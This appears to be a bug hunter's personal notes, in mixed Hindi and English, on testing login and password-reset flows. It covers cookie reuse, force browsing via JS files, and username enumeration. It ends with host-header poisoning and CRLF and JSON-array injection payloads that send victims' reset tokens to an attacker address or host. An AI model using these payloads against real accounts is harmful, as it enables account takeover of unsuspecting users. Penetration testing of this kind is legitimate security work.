

https://t.co/cxKu4z9uZY?amp=1

https://www.youtube.com/watch?v=D7yaMD-zvW0&t=530s     cabalt video 


------------- tip ------------------  login form me bugs dundhte time 

One thing that I do most often when I start with my testing is when I enter the credentials and 
click login I turn on my burp proxy and when the login functionality 
is completed and the landing page is completely loaded in the browser. 
I turn off my proxy for a while and take a look at my Burp History.
This methodology of mine gives me a good understanding of what requests the application sends and response is received on login(just login).




------------------- end -------------------------  




1 st  method 

------------------------- session highjacking and session management -------------------------------- 

log in to acc go to the cookie editor copy the cookies and save to the clipboard 

now logout and use this cookie in cookie editor extension is web app is vulneabale is log in to your acc 

---------------- end --------------------------

-------------------  2nd methods -----------------------------

Authenticatio bypass by using js file 

Js file me se hidden endpoint nikalo or acces karkne ka try karo force browsing method bolte he isse 


------------ Username and Email Address Enumeration -----------------  

1 reset and login page pe jake galat password dalo or response check karo 

register page pe jake existing user dalke dekho respone me ky milta he  	


------------------- reset password pe link me token atta he usko hatake dekho ------------ 



------------- reset password link pe host header hoga token churaya ja sakta he -------- 
alag alag headers dalke burp-collabrator ka link dalo http me token ayega 

email="victim@mail.tld%0a%0dcc:attacker@mail.tld"

im JSON array: {"email":["victim@mail.tld","atracker@mail.tld"]}

with CLRF: /resetPassword?0a%0dHost:atracker.tld (x-host, true-client-ip, x-forwarded...)	